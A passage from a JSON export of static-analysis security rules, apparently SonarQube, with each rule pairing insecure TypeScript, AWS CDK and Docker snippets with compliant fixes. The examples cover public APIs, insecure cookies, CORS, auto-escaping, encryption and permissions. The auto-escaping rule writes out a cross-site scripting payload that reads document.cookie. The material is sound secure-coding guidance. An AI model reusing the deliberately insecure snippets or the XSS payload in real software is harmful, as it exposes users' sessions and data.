\"12345678\",\n    dbInstanceClass: \"db.r5.large\",\n    allocatedStorage: \"200\",\n    iops: 1000,\n    dbSubnetGroupName: rdsSubnetGroupPrivate.ref,\n    publiclyAccessible: false,\n    vpcSecurityGroups: [sg.securityGroupId]\n})\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-instance-addressing.html\">AWS Documentation</a> - Amazon EC2 instance IP\n  addressing </li>\n  <li> <a href=\"https://docs.aws.amazon.com/dms/latest/userguide/CHAP_ReplicationInstance.PublicPrivate.html\">AWS Documentation</a> - Public and\n  private replication instances </li>\n  <li> <a href=\"https://docs.aws.amazon.com/vpc/latest/peering/what-is-vpc-peering.html\">AWS Documentation</a> - VPC Peering </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/668\">CWE-668 - Exposure of Resource to Wrong Sphere</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "typescript:S6333": {
        "name": "Creating public APIs is security-sensitive",
        "htmlDesc": "<p>Creating APIs without authentication unnecessarily increases the attack surface on the target infrastructure.</p>\n<p>Unless another authentication method is used, attackers have the opportunity to attempt attacks against the underlying API.<br> This means attacks\nboth on the functionality provided by the API and its infrastructure.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The underlying API exposes all of its contents to any anonymous Internet user. </li>\n</ul>\n<p>There is a risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>In general, prefer limiting API access to a specific set of people or entities.</p>\n<p>AWS provides multiple methods to do so:</p>\n<ul>\n  <li> <code>AWS_IAM</code>, to use standard AWS IAM roles and policies. </li>\n  <li> <code>COGNITO_USER_POOLS</code>, to use customizable OpenID Connect (OIDC) identity providers (IdP). </li>\n  <li> <code>CUSTOM</code>, to use an AWS-independant OIDC provider, glued to the infrastructure with a Lambda authorizer. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_apigateway.Resource.html\">aws-cdk-lib.aws_apigateway.Resource</a>:</p>\n<pre>\nimport {aws_apigateway as apigateway} from \"aws-cdk-lib\"\n\nconst resource = api.root.addResource(\"example\")\nresource.addMethod(\n    \"GET\",\n    new apigateway.HttpIntegration(\"https://example.org\"),\n    {\n        authorizationType: apigateway.AuthorizationType.NONE // Sensitive\n    }\n)\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_apigatewayv2.CfnRoute.html\">aws-cdk-lib.aws_apigatewayv2.CfnRoute</a>:</p>\n<pre>\nimport {aws_apigatewayv2 as apigateway} from \"aws-cdk-lib\"\n\nnew apigateway.CfnRoute(this, \"no-auth\", {\n    apiId: api.ref,\n    routeKey: \"GET /no-auth\",\n    authorizationType: \"NONE\", // Sensitive\n    target: exampleIntegration\n})\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_apigateway.Resource.html\">aws-cdk-lib.aws_apigateway.Resource</a>:</p>\n<pre>\nimport {aws_apigateway as apigateway} from \"aws-cdk-lib\"\n\nconst resource = api.root.addResource(\"example\",{\n    defaultMethodOptions:{\n        authorizationType: apigateway.AuthorizationType.IAM\n    }\n})\nresource.addMethod(\n    \"POST\",\n    new apigateway.HttpIntegration(\"https://example.org\"),\n    {\n        authorizationType: apigateway.AuthorizationType.IAM\n    }\n)\nresource.addMethod(  // authorizationType is inherited from the Resource's configured defaultMethodOptions\n    \"GET\"\n)\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_apigatewayv2.CfnRoute.html\">aws-cdk-lib.aws_apigatewayv2.CfnRoute</a>:</p>\n<pre>\nimport {aws_apigatewayv2 as apigateway} from \"aws-cdk-lib\"\n\nnew apigateway.CfnRoute(this, \"auth\", {\n    apiId: api.ref,\n    routeKey: \"POST /auth\",\n    authorizationType: \"AWS_IAM\",\n    target: exampleIntegration\n})\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/apigateway/latest/developerguide/apigateway-control-access-to-api.html\">AWS Documentation</a> -\n  Controlling and managing access to a REST API in API Gateway </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "typescript:S2092": {
        "name": "Creating cookies without the \"secure\" flag is security-sensitive",
        "htmlDesc": "<p>When a cookie is protected with the <code>secure</code> attribute set to <em>true</em> it will not be send by the browser over an unencrypted HTTP\nrequest and thus cannot be observed by an unauthorized person during a man-in-the-middle attack.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the cookie is for instance a <em>session-cookie</em> not designed to be sent over non-HTTPS communication. </li>\n  <li> it’s not sure that the website contains <a href=\"https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content\">mixed content</a> or not\n  (ie HTTPS everywhere or not) </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> It is recommended to use <code>HTTPs</code> everywhere so setting the <code>secure</code> flag to <em>true</em> should be the default behaviour\n  when creating cookies. </li>\n  <li> Set the <code>secure</code> flag to <em>true</em> for session-cookies. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p><a href=\"https://www.npmjs.com/package/cookie-session\">cookie-session</a> module:</p>\n<pre>\nlet session = cookieSession({\n  secure: false,// Sensitive\n});  // Sensitive\n</pre>\n<p><a href=\"https://www.npmjs.com/package/express-session\">express-session</a> module:</p>\n<pre>\nconst express = require('express');\nconst session = require('express-session');\n\nlet app = express();\napp.use(session({\n  cookie:\n  {\n    secure: false // Sensitive\n  }\n}));\n</pre>\n<p><a href=\"https://www.npmjs.com/package/cookies\">cookies</a> module:</p>\n<pre>\nlet cookies = new Cookies(req, res, { keys: keys });\n\ncookies.set('LastVisit', new Date().toISOString(), {\n  secure: false // Sensitive\n}); // Sensitive\n</pre>\n<p><a href=\"https://www.npmjs.com/package/csurf\">csurf</a> module:</p>\n<pre>\nconst cookieParser = require('cookie-parser');\nconst csrf = require('csurf');\nconst express = require('express');\n\nlet csrfProtection = csrf({ cookie: { secure: false }}); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p><a href=\"https://www.npmjs.com/package/cookie-session\">cookie-session</a> module:</p>\n<pre>\nlet session = cookieSession({\n  secure: true,// Compliant\n});  // Compliant\n</pre>\n<p><a href=\"https://www.npmjs.com/package/express-session\">express-session</a> module:</p>\n<pre>\nconst express = require('express');\nconst session = require('express-session');\n\nlet app = express();\napp.use(session({\n  cookie:\n  {\n    secure: true // Compliant\n  }\n}));\n</pre>\n<p><a href=\"https://www.npmjs.com/package/cookies\">cookies</a> module:</p>\n<pre>\nlet cookies = new Cookies(req, res, { keys: keys });\n\ncookies.set('LastVisit', new Date().toISOString(), {\n  secure: true // Compliant\n}); // Compliant\n</pre>\n<p><a href=\"https://www.npmjs.com/package/csurf\">csurf</a> module:</p>\n<pre>\nconst cookieParser = require('cookie-parser');\nconst csrf = require('csurf');\nconst express = require('express');\n\nlet csrfProtection = csrf({ cookie: { secure: true }}); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/315\">CWE-315 - Cleartext Storage of Sensitive Information in a Cookie</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/614\">CWE-614 - Sensitive Cookie in HTTPS Session Without 'Secure' Attribute</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "typescript:S5122": {
        "name": "Having a permissive Cross-Origin Resource Sharing policy is security-sensitive",
        "htmlDesc": "<p>Having a permissive Cross-Origin Resource Sharing policy is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0269\">CVE-2018-0269</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14460\">CVE-2017-14460</a> </li>\n</ul>\n<p><a href=\"https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy\">Same origin policy</a> in browsers prevents, by default and for\nsecurity-reasons, a javascript frontend to perform a cross-origin HTTP request to a resource that has a different origin (domain, protocol, or port)\nfrom its own. The requested target can append additional HTTP headers in response, called <a\nhref=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS\">CORS</a>, that act like directives for the browser and change the access control policy\n/ relax the same origin policy.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> You don’t trust the origin specified, example: <code>Access-Control-Allow-Origin: untrustedwebsite.com</code>. </li>\n  <li> Access control policy is entirely disabled: <code>Access-Control-Allow-Origin: *</code> </li>\n  <li> Your access control policy is dynamically defined by a user-controlled input like <a\n  href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin\"><code>origin</code></a> header. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> The <code>Access-Control-Allow-Origin</code> header should be set only for a trusted origin and for specific resources. </li>\n  <li> Allow only selected, trusted domains in the <code>Access-Control-Allow-Origin</code> header. Prefer whitelisting domains over blacklisting or\n  allowing any domain (do not use * wildcard nor blindly return the <code>Origin</code> header content without any checks). </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p><a href=\"https://nodejs.org/api/http.html\">nodejs http</a> built-in module:</p>\n<pre>\nconst http = require('http');\nconst srv = http.createServer((req, res) =&gt; {\n  res.writeHead(200, { 'Access-Control-Allow-Origin': '*' }); // Sensitive\n  res.end('ok');\n});\nsrv.listen(3000);\n</pre>\n<p><a href=\"https://www.npmjs.com/package/express\">Express.js</a> framework with <a href=\"https://www.npmjs.com/package/cors\">cors middleware</a>:</p>\n<pre>\nconst cors = require('cors');\n\nlet app1 = express();\napp1.use(cors()); // Sensitive: by default origin is set to *\n\nlet corsOptions = {\n  origin: '*' // Sensitive\n};\n\nlet app2 = express();\napp2.use(cors(corsOptions));\n</pre>\n<p>User-controlled origin:</p>\n<pre>\nfunction (req, res) {\n  const origin = req.header('Origin');\n  res.setHeader('Access-Control-Allow-Origin', origin); // Sensitive\n};\n</pre>\n<h2>Compliant Solution</h2>\n<p><a href=\"https://nodejs.org/api/http.html\">nodejs http</a> built-in module:</p>\n<pre>\nconst http = require('http');\nconst srv = http.createServer((req, res) =&gt; {\n  res.writeHead(200, { 'Access-Control-Allow-Origin': 'trustedwebsite.com' }); // Compliant\n  res.end('ok');\n});\nsrv.listen(3000);\n</pre>\n<p><a href=\"https://www.npmjs.com/package/express\">Express.js</a> framework with <a href=\"https://www.npmjs.com/package/cors\">cors middleware</a>:</p>\n<pre>\nconst cors = require('cors');\n\nlet corsOptions = {\n  origin: 'trustedwebsite.com' // Compliant\n};\n\nlet app = express();\napp.use(cors(corsOptions));\n</pre>\n<p>User-controlled origin validated with an allow-list:</p>\n<pre>\nfunction (req, res) {\n  const origin = req.header('Origin');\n\n  if (trustedOrigins.indexOf(origin) &gt;= 0) {\n    res.setHeader('Access-Control-Allow-Origin', origin);\n  }\n};\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS\">developer.mozilla.org</a> - CORS </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy\">developer.mozilla.org</a> - Same origin policy </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing\">OWASP HTML5 Security\n  Cheat Sheet</a> - Cross Origin Resource Sharing </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/346\">CWE-346 - Origin Validation Error</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/942\">CWE-942 - Overly Permissive Cross-domain Whitelist</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "typescript:S5247": {
        "name": "Disabling auto-escaping in template engines is security-sensitive",
        "htmlDesc": "<p>To reduce the risk of cross-site scripting attacks, templating systems, such as <code>Twig</code>, <code>Django</code>, <code>Smarty</code>,\n<code>Groovy's template engine</code>, allow configuration of automatic variable escaping before rendering templates. When escape occurs, characters\nthat make sense to the browser (eg: &lt;a&gt;) will be transformed/replaced with escaped/sanitized values (eg: &amp; lt;a&amp; gt; ).</p>\n<p>Auto-escaping is not a magic feature to annihilate all cross-site scripting attacks, it depends on <a\nhref=\"https://twig.symfony.com/doc/3.x/filters/escape.html\">the strategy applied</a> and the context, for example a \"html auto-escaping\" strategy\n(which only transforms html characters into <a href=\"https://developer.mozilla.org/en-US/docs/Glossary/Entity\">html entities</a>) will not be relevant\nwhen variables are used in a <a href=\"https://en.wikipedia.org/wiki/HTML_attribute\">html attribute</a> because '<code>:</code>' character is not\nescaped and thus an attack as below is possible:</p>\n<pre>\n&lt;a href=\"{{ myLink }}\"&gt;link&lt;/a&gt; // myLink = javascript:alert(document.cookie)\n&lt;a href=\"javascript:alert(document.cookie)\"&gt;link&lt;/a&gt; // JS injection (XSS attack)\n</pre>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Templates are used to render web content and\n    <ul>\n      <li> dynamic variables in templates come from untrusted locations or are user-controlled inputs </li>\n      <li> there is no local mechanism in place to sanitize or validate the inputs. </li>\n    </ul>  </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Enable auto-escaping by default and continue to review the use of inputs in order to be sure that the chosen auto-escaping strategy is the right\none.</p>\n<h2>Sensitive Code Example</h2>\n<p><a href=\"https://www.npmjs.com/package/mustache\">mustache.js</a> template engine:</p>\n<pre>\nlet Mustache = require(\"mustache\");\n\nMustache.escape = function(text) {return text;}; // Sensitive\n\nlet rendered = Mustache.render(template, { name: inputName });\n</pre>\n<p><a href=\"https://www.npmjs.com/package/handlebars\">handlebars.js</a> template engine:</p>\n<pre>\nconst Handlebars = require('handlebars');\n\nlet source = \"&lt;p&gt;attack {{name}}&lt;/p&gt;\";\n\nlet template = Handlebars.compile(source, { noEscape: true }); // Sensitive\n</pre>\n<p><a href=\"https://www.npmjs.com/package/markdown-it\">markdown-it</a> markup language parser:</p>\n<pre>\nconst markdownIt = require('markdown-it');\nlet md = markdownIt({\n  html: true // Sensitive\n});\n\nlet result = md.render('# &lt;b&gt;attack&lt;/b&gt;');\n</pre>\n<p><a href=\"https://www.npmjs.com/package/marked\">marked</a> markup language parser:</p>\n<pre>\nconst marked = require('marked');\n\nmarked.setOptions({\n  renderer: new marked.Renderer(),\n  sanitize: false // Sensitive\n});\n\nconsole.log(marked(\"# test &lt;b&gt;attack/b&gt;\"));\n</pre>\n<p><a href=\"https://www.npmjs.com/package/kramed\">kramed</a> markup language parser:</p>\n<pre>\nlet kramed = require('kramed');\n\nvar options = {\n  renderer: new kramed.Renderer({\n    sanitize: false // Sensitive\n  })\n};\n</pre>\n<h2>Compliant Solution</h2>\n<p><a href=\"https://www.npmjs.com/package/mustache\">mustache.js</a> template engine:</p>\n<pre>\nlet Mustache = require(\"mustache\");\n\nlet rendered = Mustache.render(template, { name: inputName }); // Compliant autoescaping is on by default\n</pre>\n<p><a href=\"https://www.npmjs.com/package/handlebars\">handlebars.js</a> template engine:</p>\n<pre>\nconst Handlebars = require('handlebars');\n\nlet source = \"&lt;p&gt;attack {{name}}&lt;/p&gt;\";\nlet data = { \"name\": \"&lt;b&gt;Alan&lt;/b&gt;\" };\n\nlet template = Handlebars.compile(source); // Compliant by default noEscape is set to false\n</pre>\n<p><a href=\"https://www.npmjs.com/package/markdown-it\">markdown-it</a> markup language parser:</p>\n<pre>\nlet md = require('markdown-it')(); // Compliant by default html is set to false\n\nlet result = md.render('# &lt;b&gt;attack&lt;/b&gt;');\n</pre>\n<p><a href=\"https://www.npmjs.com/package/marked\">marked</a> markup language parser:</p>\n<pre>\nconst marked = require('marked');\n\nmarked.setOptions({\n  renderer: new marked.Renderer()\n}); // Compliant by default sanitize is set to true\n\nconsole.log(marked(\"# test &lt;b&gt;attack/b&gt;\"));\n</pre>\n<p><a href=\"https://www.npmjs.com/package/kramed\">kramed</a> markup language parser:</p>\n<pre>\nlet kramed = require('kramed');\n\nlet options = {\n  renderer: new kramed.Renderer({\n    sanitize: true // Compliant\n  })\n};\n\nconsole.log(kramed('Attack [xss?](javascript:alert(\"xss\")).', options));\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> <a href=\"https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md\">OWASP Cheat\n  Sheet</a> - XSS Prevention Cheat Sheet </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)\">Top 10 2017 Category A7 - Cross-Site Scripting\n  (XSS)</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/79\">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site\n  Scripting')</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "typescript:S6330": {
        "name": "Using unencrypted SQS queues is security-sensitive",
        "htmlDesc": "<p>Amazon Simple Queue Service (SQS) is a managed message queuing service for application-to-application (A2A) communication. Amazon SQS can store\nmessages encrypted as soon as they are received. In the case that adversaries gain physical access to the storage medium or otherwise leak a message\nfrom the file system, for example through a vulnerability in the service, they are not able to access the data.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The queue contains sensitive data that could cause harm when leaked. </li>\n  <li> There are compliance requirements for the service to store data encrypted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to encrypt SQS queues that contain sensitive information. Encryption and decryption are handled transparently by SQS, so no\nfurther modifications to the application are necessary.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sqs.Queue.html\"><code>aws-cdk-lib.aws-sqs.Queue</code></a></p>\n<pre>\nimport { Queue } from 'aws-cdk-lib/aws-sqs';\n\nnew Queue(this, 'example'); // Sensitive\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sqs.CfnQueue.html\"><code>aws-cdk-lib.aws-sqs.CfnQueue</code></a></p>\n<pre>\nimport { CfnQueue } from 'aws-cdk-lib/aws-sqs';\n\nnew CfnQueue(this, 'example'); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sqs.Queue.html\"><code>aws-cdk-lib.aws-sqs.Queue</code></a></p>\n<pre>\nimport { Queue } from 'aws-cdk-lib/aws-sqs';\n\nnew Queue(this, 'example', {\n    encryption: QueueEncryption.KMS_MANAGED\n});\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sqs.CfnQueue.html\"><code>aws-cdk-lib.aws-sqs.CfnQueue</code></a></p>\n<pre>\nimport { CfnQueue } from 'aws-cdk-lib/aws-sqs';\n\nconst encryptionKey = new Key(this, 'example', {\n    enableKeyRotation: true,\n});\n\nnew CfnQueue(this, 'example', {\n    kmsMasterKeyId: encryptionKey.keyId\n});\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-server-side-encryption.html\">AWS Documentation</a> -\n  Encryption at rest </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "typescript:S6332": {
        "name": "Using unencrypted EFS file systems is security-sensitive",
        "htmlDesc": "<p>Amazon Elastic File System (EFS) is a serverless file system that does not require provisioning or managing storage. Stored files can be\nautomatically encrypted by the service. In the case that adversaries gain physical access to the storage medium or otherwise leak a message they are\nnot able to access the data.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The file system contains sensitive data that could cause harm when leaked. </li>\n  <li> There are compliance requirements for the service to store data encrypted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to encrypt EFS file systems that contain sensitive information. Encryption and decryption are handled transparently by EFS, so no\nfurther modifications to the application are necessary.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_efs.FileSystem.html\"><code>aws_cdk.aws_efs.FileSystem</code></a></p>\n<pre>\nimport { FileSystem } from 'aws-cdk-lib/aws-efs';\n\nnew FileSystem(this, 'unencrypted-explicit', {\n    vpc: new Vpc(this, 'VPC'),\n    encrypted: false // Sensitive\n});\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_efs.CfnFileSystem.html\"><code>aws_cdk.aws_efs.CfnFileSystem</code></a></p>\n<pre>\nimport { CfnFileSystem } from 'aws-cdk-lib/aws-efs';\n\nnew CfnFileSystem(this, 'unencrypted-implicit-cfn', {\n}); // Sensitive as encryption is disabled by default\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_efs.FileSystem.html\"><code>aws_cdk.aws_efs.FileSystem</code></a></p>\n<pre>\nimport { FileSystem } from 'aws-cdk-lib/aws-efs';\n\nnew FileSystem(this, 'encrypted-explicit', {\n    vpc: new Vpc(this, 'VPC'),\n    encrypted: true\n});\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_efs.CfnFileSystem.html\"><code>aws_cdk.aws_efs.CfnFileSystem</code></a></p>\n<pre>\nimport { CfnFileSystem } from 'aws-cdk-lib/aws-efs';\n\nnew CfnFileSystem(this, 'encrypted-explicit-cfn', {\n    encrypted: true\n});\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/efs/latest/ug/encryption.html\">AWS Documentation</a> - Data encryption in Amazon EFS </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "docker:S6504": {
        "name": "Allowing non-root users to modify resources copied to an image is security-sensitive",
        "htmlDesc": "<p>Ownership or write permissions for a file or directory copied to the Docker image have been assigned to a user other than root.</p>\n<p>Write permissions enable malicious actors, who have a foothold on the container, to tamper with the resource and thus potentially manipulate the\ncontainer’s expected behavior.<br> Manipulating files could disrupt services or aid in escalating privileges inside the container.<br></p>\n<p>This also breaches the container immutability principle as it facilitates container changes during its life. Immutability, a container best\npractice, allows for a more reliable and reproducible behavior of Docker containers.</p>\n<p>If a user is given ownership on a file but no write permissions, the user can still modify it by using his ownership to change the file permissions\nfirst. This is why both ownership and write permissions should be avoided.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> A non-root user owns the resource. </li>\n  <li> A non-root user has been granted write permissions for the resource. </li>\n</ul>\n<p>There is a risk if you answered yes to any of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use <code>--chmod</code> to change the permissions so that only root users can write to files. </li>\n  <li> Use <code>--chown</code> to change the file/directory owner to a root user. </li>\n  <li> Be mindful of the container immutability principle. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nFROM example\n\nRUN useradd exampleuser\n# Sensitive\nCOPY --chown=exampleuser:exampleuser src.py dst.py\n</pre>\n<h2>Compliant Solution</h2>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nFROM example\n\nCOPY --chown=root:root --chmod=755 src.py dst.py\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.docker.com/engine/reference/builder/#add\">Dockerfile reference</a> - ADD instruction </li>\n  <li> <a href=\"https://docs.docker.com/engine/reference/builder/#copy\">Dockerfile reference</a> - COPY instruction </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/732\">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>\n  <li> <a href=\"https://cloud.google.com/architecture/best-practices-for-operating-containers#immutability\">Google Cloud, Immutability</a> - Best\n  practices for operating containers </li>\n</ul>",
        "severity": "MINOR"
      },
      "docker:S6497": {
        "name": "Pulling an image based on its digest is security-sensitive",
        "htmlDesc": "<p>This rule is deprecated; use <a href='/coding_rules#rule_key=docker%3AS6596'>S6596</a> instead.</p>\n<p>A container image digest uniquely and immutably identifies a container image. A tag, on the other hand, is a mutable reference to a container\nimage.</p>\n<p>This tag can be updated to point to another version of the container at any point in time.<br> In general, the use of image digests instead of tags\nis intended to keep determinism stable within a system or infrastructure for reliability reasons.</p>\n<p>The problem is that pulling such an image prevents the resulting container from being updated or patched in order to remove vulnerabilities or\nsignificant bugs.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> You expect to receive security updates of the base image. </li>\n</ul>\n<p>There is a risk if you answer yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Containers should get the latest security updates. If there is a need for determinism, the solution is to find tags that are not as prone to change\nas <code>latest</code> or <a href=\"https://github.com/docker-library/faq#whats-the-difference-between-shared-and-simple-tags\">shared tags</a>.</p>\n<p>To do so, favor a more precise tag that uses <a href=\"https://semver.org/\">semantic versioning</a> and target a major version, for example.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nFROM mongo@sha256:8eb8f46e22f5ccf1feb7f0831d02032b187781b178cb971cd1222556a6cee9d1\n\nRUN echo ls\n</pre>\n<h2>Compliant Solution</h2>\n<p>Here, mongo:6.0 is better than using a digest, and better than using a more precise version, such as 6.0.4, because it would prevent 6.0.5 security\nupdates:</p>\n<pre>\nFROM mongo:6.0\n\nRUN echo ls\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://github.com/safe-waters/docker-lock\">Docker-Lock</a> </li>\n  <li> <a\n  href=\"https://cloud.google.com/kubernetes-engine/docs/archive/using-container-image-digests-in-kubernetes-manifests#recommendations\">Skaffold, kpt,\n  digester, kustomize, gke-deploy, ko, and Bazel</a> </li>\n  <li> <a href=\"https://cloud.google.com/kubernetes-engine/docs/archive/using-container-images\">GKE, Using Container Image Digests</a> </li>\n  <li> <a href=\"https://docs.openshift.com/container-platform/3.11/architecture/core_concepts/builds_and_image_streams.html#image-streams\">OpenShift,\n  Builds and Image Streams</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "azureresourcemanager:S6378": {
        "name": "Disabling Managed Identities for Azure resources is security-sensitive",
        "htmlDesc": "<p>Disabling Managed Identities can reduce an organization’s ability to protect itself against configuration faults and credential leaks.</p>\n<p>Authenticating via managed identities to an Azure resource solely relies on an API call with a non-secret token. The process is inner to Azure:\nsecrets used by Azure are not even accessible to end-users.</p>\n<p>In typical scenarios without managed identities, the use of credentials can lead to mistakenly leaving them in code bases. In addition,\nconfiguration faults may also happen when storing these values or assigning them permissions.</p>\n<p>By transparently taking care of the Azure Active Directory authentication, Managed Identities allow getting rid of day-to-day credentials\nmanagement.</p>\n<h2>Ask Yourself Whether</h2>\n<p>The resource:</p>\n<ul>\n  <li> Needs to authenticate to Azure resources that support Azure Active Directory (AAD). </li>\n  <li> Uses a different Access Control system that doesn’t guarantee the same security controls as AAD, or no Access Control system at all. </li>\n</ul>\n<p>There is a risk if you answered yes to all of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Enable the Managed Identities capabilities of this Azure resource. If supported, use a System-Assigned managed identity, as:</p>\n<ul>\n  <li> It cannot be shared across resources. </li>\n  <li> Its life cycle is deeply tied to the life cycle of its Azure resource. </li>\n  <li> It provides a unique independent identity. </li>\n</ul>\n<p>Alternatively, User-Assigned Managed Identities can also be used but don’t guarantee the properties listed above.</p>\n<h2>Sensitive Code Example</h2>\n<p>Using ARM templates:</p>\n<pre 